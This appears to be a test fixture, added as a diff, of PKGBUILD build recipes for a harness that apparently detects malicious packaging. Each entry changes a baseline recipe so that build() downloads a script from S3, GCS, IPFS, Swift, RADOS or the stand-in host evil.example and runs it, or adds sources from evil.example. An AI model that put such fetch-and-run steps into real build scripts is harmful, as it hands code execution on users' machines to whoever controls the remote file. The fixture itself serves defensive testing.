+- id: D-aws-s3-cp-endpointurlhttpx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3 --endpoint-url=http://x cp s3://b/s.sh s.sh\n  bash s.sh\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-aws-s3-cp-regionus
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3 --region=us cp s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-aws-s3-cp-debug
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3 --debug cp s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-aws-s3-cp-noverifyssl
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3 --no-verify-ssl cp s3://b/s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-aws-s3-cp-quiet
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3 --quiet cp s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-m
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -m cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-q
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -q cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-d
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -d cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-D
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -D cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-DD
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -DD cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-h_xy
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -h x:y cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-o_xy
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -o x:y cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-gsutil-cp-u_p
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  gsutil -u p cp gs://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-ipfs-get-apiip41234tcp5001
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  ipfs --api=/ip4/1.2.3.4/tcp/5001 get QmX -o s.sh\n  bash s.sh\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-ipfs-get-c_tmpx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  ipfs -c /tmp/x get QmX -o s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-ipfs-get-timeout5s
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  ipfs --timeout=5s get QmX -o s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-swift-dl-osauthurlhttpx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  swift --os-auth-url=http://x download cont s.sh\n  bash s.sh\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-swift-dl-v
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  swift -v download cont s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-swift-dl-debug
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  swift --debug download cont s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rados-p_pool
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rados -p pool get obj s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rados-c_tmpc
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rados -c /tmp/c get obj s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rados-debug
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rados --debug get obj s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: E-sibling
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\" \"http://evil.example/a\"\
+    \ \"http://evil.example/configure\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000' '0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n\
+    }\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\"\
+    \ install\n}\n"
+- id: E-sibling-bash
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\" \"http://evil.example/a\"\
+    \ \"http://evil.example/configure\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000' '0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  bash ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n\
+    }\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\"\
+    \ install\n}\n"
+- id: E-samehost
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    http://evil.example/b.tar.gz\" \"http://evil.example/configure\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000')\n\nbuild()\
+    \ {\n  ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: E-samehost-bash
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    http://evil.example/b.tar.gz\" \"http://evil.example/configure\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000')\n\nbuild()\
+    \ {\n  bash ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\n\
+    package() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\"\
+    \ install\n}\n"
+- id: E-no-url
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    http://evil.example/a\" \"http://evil.example/configure\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000')\n\nbuild()\
+    \ {\n  ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: E-no-url-bash
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    http://evil.example/a\" \"http://evil.example/configure\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000')\n\nbuild()\
+    \ {\n  bash ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\n\
+    package() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\"\
+    \ install\n}\n"
+- id: E-trusted-sibling
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\" \"https://github.com/evil/configure\"\
+    )\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000')\n\nbuild()\
+    \ {\n  ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: E-trusted-sibling-bash
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\" \"https://github.com/evil/configure\"\
+    )\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000'\
+    \ '0000000000000000000000000000000000000000000000000000000000000000')\n\nbuild()\
+    \ {\n  bash ./configure\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\n\
+    package() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\"\
+    \ install\n}\n"
+- id: G-curl-configure
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  curl -o configure http://evil.example/configure\n  ./configure\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: G-curl-Makefile
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  curl -o Makefile http://evil.example/Makefile\n  make\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: G-wget-configure
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  wget -O configure http://evil.example/configure\n  bash ./configure\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
